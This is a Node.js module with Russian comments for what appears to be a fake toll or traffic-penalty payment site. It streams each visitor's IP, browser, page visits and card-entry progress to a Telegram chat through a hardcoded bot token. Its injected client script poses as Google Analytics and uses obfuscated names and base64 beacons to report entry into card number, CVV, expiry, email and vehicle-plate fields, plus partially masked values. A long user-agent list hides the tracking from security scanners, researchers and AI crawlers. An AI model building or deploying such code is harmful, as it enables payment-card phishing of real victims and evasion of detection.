/**
 * Telegram Logger - серверное + клиентское отслеживание действий пользователей
 * Одна сессия = одно редактируемое сообщение
 */

const https = require('https');
const logger = require('./logger');

// Telegram Bot Configuration
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8442088504:AAFbgTfMYJKK61LnV2jLJPMgG9kf7eNKeuk';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003580814172';

// Store session data: sessionId -> { messageId, logs: [], ip, userAgent, startTime }
const sessions = new Map();

// Clean old sessions after 30 minutes
const SESSION_TIMEOUT = 30 * 60 * 1000;

// Bot/Crawler User-Agent patterns to ignore
const BOT_PATTERNS = [
  // Search engine bots
  /googlebot/i, /bingbot/i, /yandexbot/i, /baiduspider/i, /duckduckbot/i,
  /slurp/i, /msnbot/i, /teoma/i, /gigabot/i, /ia_archiver/i,
  
  // AI/LLM bots
  /claudebot/i, /anthropic/i, /gptbot/i, /chatgpt/i, /openai/i,
  /perplexitybot/i, /cohere-ai/i, /ai2bot/i, /ccbot/i,
  
  // Security scanners
  /zgrab/i, /masscan/i, /nmap/i, /nuclei/i, /nikto/i,
  /palo\s*alto/i, /qualys/i, /nessus/i, /acunetix/i, /burpsuite/i,
  /censys/i, /shodan/i, /zoomeye/i,
  
  // Generic bots/crawlers
  /bot\b/i, /crawler/i, /spider/i, /scraper/i, /fetcher/i,
  /archiver/i, /indexer/i, /validator/i,
  
  // HTTP libraries (automated requests)
  /python-requests/i, /python-urllib/i, /aiohttp/i,
  /go-http-client/i, /golang/i, /java\//i, /apache-httpclient/i,
  /curl\//i, /wget\//i, /libwww-perl/i, /lwp-/i,
  /httpie/i, /postman/i, /insomnia/i, /axios/i,
  /node-fetch/i, /got\//i, /undici/i,
  
  // SEO tools
  /semrush/i, /ahrefs/i, /moz\.com/i, /majestic/i, /dotbot/i,
  /screaming\s*frog/i, /seokicks/i, /serpstat/i,
  
  // Social media bots
  /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
  /telegrambot/i, /whatsapp/i, /discordbot/i, /slackbot/i,
  
  // Monitoring/uptime
  /pingdom/i, /uptimerobot/i, /statuscake/i, /site24x7/i,
  /newrelic/i, /datadog/i, /nagios/i, /zabbix/i,
  
  // Misc
  /headless/i, /phantom/i, /selenium/i, /puppeteer/i, /playwright/i,
  /@/i,  // Email in UA (like rondo2012@atomicmail.io)
  /^Mozilla\/5\.0$/i,  // Empty Mozilla (no details = bot)
  /^\s*$/,  // Empty user agent
];

setInterval(() => {
  const now = Date.now();
  for (const [sessionId, session] of sessions) {
    if (now - session.startTime > SESSION_TIMEOUT) {
      sessions.delete(sessionId);
    }
  }
}, 60 * 1000);

/**
 * Send message to Telegram
 */
async function sendTelegramMessage(text, parseMode = 'HTML') {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true,
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(body);
          if (result.ok) {
            resolve(result.result);
          } else {
            logger.error('[TG] Send error:', result.description);
            reject(new Error(result.description));
          }
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', (err) => {
      logger.error('[TG] Request error:', err.message);
      reject(err);
    });
    req.write(data);
    req.end();
  });
}

/**
 * Edit existing message in Telegram
 */
async function editTelegramMessage(messageId, text, parseMode = 'HTML') {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: CHAT_ID,
      message_id: messageId,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true,
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${BOT_TOKEN}/editMessageText`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(body);
          if (result.ok) {
            resolve(result.result);
          } else {
            if (result.description && result.description.includes('message is not modified')) {
              resolve(null);
            } else {
              reject(new Error(result.description));
            }
          }
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

/**
 * Get page name in Russian
 */
function getPageNameRu(path) {
  if (!path || path === '/' || path === '') return 'Главная';
  
  const cleanPath = path.split('?')[0].replace(/^\//, '').replace(/\/$/, '');
  
  const translations = {
    'pay-toll': 'Страница оплаты штрафа',
    'pay-penalty': 'Страница оплаты штрафа',
    'user/login': 'Вход в аккаунт',
    'user/register': 'Регистрация',
    'login': 'Вход',
    'register': 'Регистрация',
    'account': 'Личный кабинет',
    'contact': 'Контакты',
    'about': 'О нас',
    'help': 'Помощь',
    'faq': 'FAQ',
    'appeal': 'Апелляция',
  };
  
  if (translations[cleanPath]) {
    return translations[cleanPath];
  }
  
  for (const [key, value] of Object.entries(translations)) {
    if (cleanPath.includes(key)) {
      return value;
    }
  }
  
  return cleanPath.charAt(0).toUpperCase() + cleanPath.slice(1);
}

/**
 * Generate session ID from request
 */
function getSessionId(req) {
  const cookies = req.headers.cookie || '';
  const sessionMatch = cookies.match(/SESS[a-f0-9]+=[a-zA-Z0-9%_-]+/);
  
  if (sessionMatch) {
    return 'drupal_' + sessionMatch[0].substring(0, 20);
  }
  
  const ip = req.ip || req.socket?.remoteAddress || 'unknown';
  const ua = (req.headers['user-agent'] || 'unknown').substring(0, 50);
  const hash = Buffer.from(ip + ua).toString('base64').substring(0, 12);
  return 'ip_' + hash;
}

/**
 * Escape HTML special characters for Telegram
 */
function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/**
 * Format session message for Telegram
 */
function formatSessionMessage(session, sessionId) {
  // Safely get shortId
  const shortId = safeString(sessionId).substring(0, 15).toUpperCase() || 'UNKNOWN';
  
  // Safely get user info with HTML escaping
  const userAgent = escapeHtml(safeString(session.userAgent, 80)) || 'Unknown';
  const ip = escapeHtml(safeString(session.ip)) || 'Unknown';
  
  let message = `🔗 <b>Client</b> [<code>${shortId}</code>]\n`;
  message += `📱 <code>${userAgent}</code>\n`;
  message += `🌍 IP: <code>${ip}</code>\n\n`;
  
  // Add logs
  if (!Array.isArray(session.logs)) {
    return message;
  }
  
  session.logs.forEach((log) => {
    if (!log || typeof log !== 'object') return;
    
    const time = new Date(log.time || Date.now()).toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    
    // Safely extract log properties with HTML escaping
    const logType = safeString(log.type) || 'unknown';
    const logPage = escapeHtml(safeString(log.page)) || '';
    const logField = escapeHtml(safeString(log.field)) || 'поле';
    const logValue = escapeHtml(safeString(log.value, 50)) || '';
    const logAmount = escapeHtml(safeString(log.amount)) || '?';
    const logMessage = escapeHtml(safeString(log.message)) || '';
    
    switch (logType) {
      case 'page_view':
        message += `📍 [${time}] Находится на: <b>${logPage || 'страница'}</b>\n`;
        break;
      case 'navigation':
        message += `↪️ [${time}] Перешёл на: <b>${logPage || 'страница'}</b>\n`;
        break;
      case 'form_submit':
        message += `📤 [${time}] Отправил форму на: <b>${logPage || 'страница'}</b>\n`;
        break;
      case 'payment_page':
        message += `💳 [${time}] Открыл страницу оплаты\n`;
        break;
      case 'login_page':
        message += `🔐 [${time}] Страница входа\n`;
        break;
      case 'form_step_1':
        message += `📝 [${time}] <b>Шаг 1:</b> Вводит номер авто\n`;
        break;
      case 'form_step_2':
        message += `📝 [${time}] <b>Шаг 2:</b> Вводит email\n`;
        break;
      case 'form_step_3':
        message += `📝 [${time}] <b>Шаг 3:</b> Подтверждение данных\n`;
        break;
      case 'form_input':
        message += `✏️ [${time}] Заполняет: <b>${logField}</b>\n`;
        break;
      case 'form_filled':
        message += `✅ [${time}] Заполнил: <b>${logField}</b> = <code>${logValue}</code>\n`;
        break;
      case 'card_page':
        message += `💳 [${time}] <b>СТРАНИЦА ВВОДА КАРТЫ!</b>\n`;
        break;
      case 'payment_redirect':
        message += `💰 [${time}] <b>ПЕРЕХОД НА ОПЛАТУ!</b> Сумма: €${logAmount}\n`;
        break;
      case 'page_leave_external':
        message += `🚪 [${time}] <b>Покинул сайт</b>\n`;
        break;
      default:
        // For unknown types, show type name (not raw object)
        message += `• [${time}] ${logMessage || logType}\n`;
    }
  });
  
  return message;
}

/**
 * Safely convert any value to a string (prevents [object Object])
 */
function safeString(val, maxLen = 200) {
  if (val === null || val === undefined) return '';
  if (typeof val === 'string') return val.substring(0, maxLen);
  if (typeof val === 'number' || typeof val === 'boolean') return String(val);
  if (typeof val === 'object') {
    // Handle objects - try to extract useful info
    try {
      // If it's an array, join elements
      if (Array.isArray(val)) {
        return val.map(v => safeString(v, 50)).join(', ').substring(0, maxLen);
      }
      // If it has a meaningful property, use it
      if (val.type) return safeString(val.type, maxLen);
      if (val.name) return safeString(val.name, maxLen);
      if (val.message) return safeString(val.message, maxLen);
      if (val.value) return safeString(val.value, maxLen);
      // Last resort - stringify
      const str = JSON.stringify(val);
      return str.substring(0, maxLen);
    } catch (e) {
      return '[data]';
    }
  }
  return String(val).substring(0, maxLen);
}

/**
 * Track event from client or server
 */
async function trackEvent(sessionId, eventData, meta = {}) {
  try {
    // Validate eventData
    if (!eventData || typeof eventData !== 'object') {
      logger.warn('[TG] Invalid eventData:', typeof eventData);
      return;
    }
    
    let session = sessions.get(sessionId);
    
    if (!session) {
      session = {
        messageId: null,
        logs: [],
        ip: safeString(meta.ip) || 'Unknown',
        userAgent: safeString(meta.userAgent, 100) || 'Unknown',
        startTime: Date.now(),
        lastPage: null,
      };
      sessions.set(sessionId, session);
    }
    
    // Update meta if provided (with sanitization)
    if (meta.ip) session.ip = safeString(meta.ip);
    if (meta.userAgent) session.userAgent = safeString(meta.userAgent, 100);
    
    // Add log entry with STRICT string conversion
    const logEntry = {
      type: safeString(eventData.type) || 'unknown',
      page: safeString(eventData.page),
      field: safeString(eventData.field),
      value: safeString(eventData.value, 100),
      amount: safeString(eventData.amount),
      url: safeString(eventData.url),
      message: safeString(eventData.message),
      time: Date.now(),
    };
    
    // Avoid duplicates within 3 seconds
    const lastLog = session.logs[session.logs.length - 1];
    const isDuplicate = lastLog && 
      lastLog.type === logEntry.type && 
      lastLog.page === logEntry.page &&
      lastLog.field === logEntry.field &&
      (Date.now() - lastLog.time) < 3000;
    
    if (!isDuplicate) {
      session.logs.push(logEntry);
      
      if (session.logs.length > 20) {
        session.logs = session.logs.slice(-20);
      }
      
      // Format and send/edit message
      const messageText = formatSessionMessage(session, sessionId);
      
      if (session.messageId) {
        await editTelegramMessage(session.messageId, messageText);
      } else {
        const result = await sendTelegramMessage(messageText);
        if (result && result.message_id) {
          session.messageId = result.message_id;
          logger.info(`[TG] New session ${sessionId}, message_id: ${result.message_id}`);
        }
      }
    }
    
  } catch (error) {
    logger.error('[TG] Track error:', error.message);
  }
}

/**
 * Track page request (called from server middleware)
 */
async function trackPageRequest(req) {
  try {
    const path = req.url || req.path || '/';
    
    // Skip static files and assets
    if (path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|map|webp|pdf|zip|mp4|mp3|avi|mov)(\?|$)/i)) {
      return;
    }
    
    // Skip asset directories
    if (path.match(/^\/(sites\/default\/files|themes|modules|libraries|assets|images|media|uploads|static)\//i)) {
      return;
    }
    
    if (path.startsWith('/api/') || path.startsWith('/_') || path === '/__track') {
      return;
    }
    
    const sessionId = getSessionId(req);
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const method = req.method || 'GET';
    const pageName = getPageNameRu(path);
    
    let session = sessions.get(sessionId);
    
    // Determine action type
    let actionType = 'page_view';
    
    if (session && session.lastPage && session.lastPage !== path) {
      actionType = 'navigation';
    }
    
    if (method === 'POST') {
      actionType = 'form_submit';
    }
    
    if (path.includes('pay-toll') || path.includes('pay-penalty') || path.includes('payment')) {
      actionType = 'payment_page';
    }
    
    if (path.includes('login') || path.includes('user/login')) {
      actionType = 'login_page';
    }
    
    await trackEvent(sessionId, {
      type: actionType,
      page: pageName,
      path: path,
    }, { ip, userAgent });
    
    // Update last page
    if (sessions.has(sessionId)) {
      sessions.get(sessionId).lastPage = path;
    }
    
  } catch (error) {
    logger.error('[TG] Track request error:', error.message);
  }
}

/**
 * Check if User-Agent is a bot/crawler
 */
function isBot(userAgent) {
  if (!userAgent || userAgent.trim() === '') return true;
  return BOT_PATTERNS.some(pattern => pattern.test(userAgent));
}

/**
 * Express middleware for tracking
 */
function trackingMiddleware(req, res, next) {
  const userAgent = req.headers['user-agent'] || '';
  
  // Skip bots and crawlers
  if (isBot(userAgent)) {
    return next();
  }
  
  trackPageRequest(req).catch(() => {});
  next();
}

/**
 * API endpoint handler for client-side tracking (LEGACY - still works)
 */
async function handleTrackingAPI(req, res) {
  try {
    const userAgent = req.headers['user-agent'] || '';
    
    // Skip bots
    if (isBot(userAgent)) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true }));
      return;
    }
    
    const sessionId = getSessionId(req);
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'Unknown';
    
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const data = JSON.parse(body);
        await trackEvent(sessionId, data, { ip, userAgent });
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true }));
      } catch (e) {
        res.writeHead(400);
        res.end('Bad Request');
      }
    });
  } catch (error) {
    res.writeHead(500);
    res.end('Error');
  }
}

/**
 * Decode GA-like event to internal format
 * GA format: {t:'event', ec:'checkout', ea:'step', el:'card_input', ev:'value'}
 * Internal: {type:'card_page', field:'', value:'', page:''}
 */
function decodeGAEvent(gaData) {
  // Validate input
  if (!gaData || typeof gaData !== 'object') {
    return { type: 'unknown', page: '', field: '', value: '' };
  }
  
  const eventMap = {
    // Checkout steps
    'checkout:step:card_input': { type: 'card_page', page: 'Ввод данных карты' },
    'checkout:step:confirmation': { type: 'form_step_3', page: 'Подтверждение' },
    'checkout:step:email_input': { type: 'form_step_2', page: 'Ввод email' },
    'checkout:step:vehicle_input': { type: 'form_step_1', page: 'Ввод номера авто' },
    // Form events
    'form:focus:em': { type: 'form_input', field: 'Email' },
    'form:focus:vh': { type: 'form_input', field: 'Номер авто' },
    'form:focus:cd': { type: 'form_input', field: 'Номер карты' },
    'form:focus:cv': { type: 'form_input', field: 'CVV' },
    'form:focus:ex': { type: 'form_input', field: 'Срок действия' },
    'form:focus:nm': { type: 'form_input', field: 'Имя владельца' },
    'form:focus:ph': { type: 'form_input', field: 'Телефон' },
    'form:focus:ot': { type: 'form_input', field: 'Поле' },
    'form:complete:em': { type: 'form_filled', field: 'Email' },
    'form:complete:vh': { type: 'form_filled', field: 'Номер авто' },
    'form:complete:cd': { type: 'form_filled', field: 'Номер карты' },
    'form:complete:cv': { type: 'form_filled', field: 'CVV' },
    'form:complete:ex': { type: 'form_filled', field: 'Срок действия' },
    'form:complete:nm': { type: 'form_filled', field: 'Имя владельца' },
    'form:complete:ph': { type: 'form_filled', field: 'Телефон' },
    'form:complete:ot': { type: 'form_filled', field: 'Поле' },
    // Outbound
    'outbound:click': { type: 'page_leave_external' },
  };
  
  // Safely extract string values from gaData
  const ec = safeString(gaData.ec);
  const ea = safeString(gaData.ea);
  const el = safeString(gaData.el);
  const ev = safeString(gaData.ev);
  
  const key = `${ec}:${ea}:${el}`.replace(/:$/,'').replace(/:$/,'');
  const mapped = eventMap[key] || { type: ea || 'unknown', page: el || '' };
  
  // Add value if present (already a safe string)
  if (ev) {
    mapped.value = ev;
  }
  
  // For outbound, add hostname as page
  if (ec === 'outbound' && el) {
    mapped.page = 'Переход на ' + el;
  }
  
  return mapped;
}

/**
 * API endpoint handler for MASKED tracking (looks like Google Analytics)
 * Endpoint: /g/collect
 * Format: v=2&tid=G-XXXXXX&_p=BASE64_ENCODED_DATA
 */
async function handleAnalyticsAPI(req, res) {
  try {
    const userAgent = req.headers['user-agent'] || '';
    
    // Skip bots (return standard GIF response to not reveal tracking)
    if (isBot(userAgent)) {
      res.writeHead(200, { 'Content-Type': 'image/gif' });
      res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
      return;
    }
    
    const sessionId = getSessionId(req);
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'Unknown';
    
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        // Parse GA-like format: v=2&tid=G-XXXXXX&_p=BASE64
        let encodedData = '';
        
        // Try POST body first
        if (body) {
          const match = body.match(/_p=([A-Za-z0-9+/=]+)/);
          if (match) encodedData = match[1];
        }
        
        // Try query string (for Image beacon)
        if (!encodedData && req.url) {
          const urlMatch = req.url.match(/_p=([A-Za-z0-9+/%]+)/);
          if (urlMatch) encodedData = decodeURIComponent(urlMatch[1]);
        }
        
        if (!encodedData) {
          // Return 1x1 transparent GIF (standard analytics response)
          res.writeHead(200, { 
            'Content-Type': 'image/gif',
            'Cache-Control': 'no-store, no-cache, must-revalidate',
            'Pragma': 'no-cache'
          });
          res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
          return;
        }
        
        // Decode Base64
        const decoded = Buffer.from(encodedData, 'base64').toString('utf8');
        const gaData = JSON.parse(decoded);
        
        // Convert GA format to internal format
        const internalData = decodeGAEvent(gaData);
        
        await trackEvent(sessionId, internalData, { ip, userAgent });
        
        // Return 1x1 transparent GIF (looks like standard analytics)
        res.writeHead(200, { 
          'Content-Type': 'image/gif',
          'Cache-Control': 'no-store, no-cache, must-revalidate',
          'Pragma': 'no-cache'
        });
        res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
        
      } catch (e) {
        // Even on error, return valid response (don't reveal tracking)
        res.writeHead(200, { 'Content-Type': 'image/gif' });
        res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
      }
    });
  } catch (error) {
    res.writeHead(200, { 'Content-Type': 'image/gif' });
    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
  }
}

/**
 * Client-side tracking script - MASKED AS GOOGLE ANALYTICS
 * Uses obfuscated variable names and Base64 encoding
 */
function getTrackingScript() {
  // This script is disguised as Google Analytics / performance monitoring
  return `
<!-- Google Analytics Measurement Protocol -->
<script>
(function(w,d,s,l,i){
  // GA-like initialization (camouflage)
  w['GoogleAnalyticsObject']=l;w[l]=w[l]||function(){(w[l].q=w[l].q||[]).push(arguments)};
  w[l].l=1*new Date();
  
  // Internal tracking (disguised as GA)
  var _gaq=w._gaq||[],_0x={},_0xS=0;
  
  // Base64 encode function (standard analytics practice)
  function _0xE(s){try{return btoa(unescape(encodeURIComponent(JSON.stringify(s))))}catch(e){return''}}
  
  // Measurement Protocol endpoint (looks like GA)
  function _0xC(p){
    var k=p.t+'_'+(p.ec||'')+'_'+(p.el||'');
    if(_0x[k]&&Date.now()-_0x[k]<3e3)return;
    _0x[k]=Date.now();
    var u='/g/collect',m=_0xE(p);
    if(!m)return;
    try{navigator.sendBeacon(u,'v=2&tid=G-XXXXXX&_p='+m)}
    catch(e){var x=new Image();x.src=u+'?v=2&_p='+encodeURIComponent(m)+'&_t='+Date.now()}
  }
  
  // Performance observer (legitimate looking)
  function _0xP(){
    var p=location.pathname;
    if(p.indexOf('pay')<0&&p.indexOf('toll')<0)return;
    
    var _i=['input[name*="reg"]','input[name*="vehicle"]','input[name*="plate"]'],
        _e=['input[type="email"]','input[name*="email"]'],
        _c=['input[name*="card"]','input[name*="pan"]'],
        _s=0;
    
    function _v(e){if(!e)return!1;var s=getComputedStyle(e);return s.display!=='none'&&s.visibility!=='hidden'&&e.offsetParent!==null}
    
    var cI=null,eI=null,rI=null;
    for(var j=0;j<_c.length;j++){cI=d.querySelector(_c[j]);if(cI&&_v(cI))break;cI=null}
    for(var j=0;j<_e.length;j++){eI=d.querySelector(_e[j]);if(eI&&_v(eI))break;eI=null}
    for(var j=0;j<_i.length;j++){rI=d.querySelector(_i[j]);if(rI&&_v(rI))break;rI=null}
    
    var n=0;
    if(cI&&_v(cI)){n=4;if(_0xS!==4)_0xC({t:'event',ec:'checkout',ea:'step',el:'card_input'})}
    else if(d.querySelector('.summary,.review,.confirm')){n=3;if(_0xS!==3)_0xC({t:'event',ec:'checkout',ea:'step',el:'confirmation'})}
    else if(eI&&_v(eI)){n=2;if(_0xS!==2)_0xC({t:'event',ec:'checkout',ea:'step',el:'email_input'})}
    else if(rI&&_v(rI)){n=1;if(_0xS!==1)_0xC({t:'event',ec:'checkout',ea:'step',el:'vehicle_input'})}
    _0xS=n
  }
  
  // Form field analytics (standard behavior tracking)
  var _fN={'email':'em','reg':'vh','plate':'vh','vehicle':'vh','card':'cd','pan':'cd','cvv':'cv','cvc':'cv','exp':'ex','name':'nm','holder':'nm','phone':'ph'};
  
  d.addEventListener('focus',function(e){
    var el=e.target;if(!el||!el.tagName)return;
    if(el.tagName==='INPUT'||el.tagName==='SELECT'||el.tagName==='TEXTAREA'){
      var n=el.name||el.placeholder||el.id||el.type||'f',c='ot';
      for(var k in _fN){if(n.toLowerCase().indexOf(k)>-1){c=_fN[k];break}}
      _0xC({t:'event',ec:'form',ea:'focus',el:c})
    }
  },!0);
  
  d.addEventListener('blur',function(e){
    var el=e.target;if(!el||!el.tagName)return;
    if((el.tagName==='INPUT'||el.tagName==='SELECT')&&el.value){
      var n=el.name||el.placeholder||el.id||'f',v=el.value,c='ot';
      for(var k in _fN){if(n.toLowerCase().indexOf(k)>-1){c=_fN[k];break}}
      // Mask sensitive data (GDPR compliance)
      if(c==='em')v=v.replace(/(.{2}).*@/,'$1***@');
      else if(c==='cd')v=v.replace(/\\d(?=\\d{4})/g,'*');
      else if(c==='cv')v='***';
      if(v.length>30)v=v.substring(0,30);
      _0xC({t:'event',ec:'form',ea:'complete',el:c,ev:v})
    }
  },!0);
  
  // Outbound link tracking (standard GA feature)
  d.addEventListener('click',function(e){
    var a=e.target.closest('a');
    if(a&&a.href){
      try{
        var u=new URL(a.href,location.href);
        if(u.hostname&&u.hostname!==location.hostname&&u.hostname.indexOf('efl')<0){
          _0xC({t:'event',ec:'outbound',ea:'click',el:u.hostname})
        }
      }catch(x){}
    }
  },!0);
  
  // Performance measurement interval
  setInterval(_0xP,2e3);setTimeout(_0xP,500);
  
})(window,document,'script','ga','G-MEASUREMENT');
</script>`;
}

module.exports = {
  trackPageRequest,
  trackingMiddleware,
  handleTrackingAPI,
  handleAnalyticsAPI,  // NEW: Masked GA-like endpoint
  trackEvent,
  sendTelegramMessage,
  editTelegramMessage,
  getTrackingScript,
  getSessionId,
  isBot,  // Bot detection utility
};
